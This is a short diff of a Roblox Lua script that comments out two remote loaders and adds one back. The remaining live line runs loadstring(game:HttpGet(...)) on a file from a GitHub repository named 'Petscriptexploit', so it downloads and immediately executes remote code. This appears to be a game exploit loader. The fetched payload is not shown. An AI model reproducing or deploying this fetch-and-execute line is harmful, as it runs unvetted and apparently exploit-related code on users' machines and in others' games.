@@ -4,12 +4,13 @@
 
 
 -- First loadstring
-local firstFunction = loadstring(game:HttpGet('https://egorikusa.space/3a5fb6fd1f6794a618e1b8cd.lua'))()
-firstFunction()  -- Executes immediately
+-- local firstFunction = loadstring(game:HttpGet('https://egorikusa.space/3a5fb6fd1f6794a618e1b8cd.lua'))()
+-- firstFunction()  -- Executes immediately
 
 -- Wait 1 second
-wait(1)
+-- wait(1)
 
 -- Second loadstring
-local secondFunction = loadstring(game:HttpGet('https://raw.githubusercontent.com/Petscriptexploit/themes/refs/heads/main/g'))()
-secondFunction()  -- Executes after the delay
+-- local secondFunction = loadstring(game:HttpGet('https://raw.githubusercontent.com/Petscriptexploit/themes/refs/heads/main/g'))()
+-- secondFunction()  -- Executes after the delay
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Petscriptexploit/themes/refs/heads/main/g'))()
